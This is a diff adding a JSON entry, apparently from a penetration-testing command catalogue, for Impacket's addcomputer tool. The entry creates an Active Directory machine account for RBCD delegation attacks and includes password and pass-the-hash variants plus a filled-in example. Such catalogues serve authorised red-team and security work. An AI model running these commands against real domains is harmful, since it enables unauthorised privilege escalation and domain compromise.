@@ -1,0 +1,31 @@
+{
+  "id": "addcomputer",
+  "name": "Impacket Add Computer",
+  "command": "impacket-addcomputer -method LDAPS -computer-name '<computer_name>$' -computer-pass '<computer_pass>' -dc-host <ip> '<domain>/<user>:<password>'",
+  "description": "Create a new computer account in Active Directory (used for RBCD attacks)",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "ldap"
+  ],
+  "tags": [
+    "impacket",
+    "addcomputer",
+    "computer-account",
+    "rbcd",
+    "delegation",
+    "ldaps"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "impacket-addcomputer -method LDAPS -computer-name '<computer_name>$' -computer-pass '<computer_pass>' -dc-host <ip> -hashes ':<hash>' '<domain>/<user>'"
+    }
+  ],
+  "examples": [
+    "impacket-addcomputer -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host 192.168.1.2 'corp.local/user:password'"
+  ]
+}
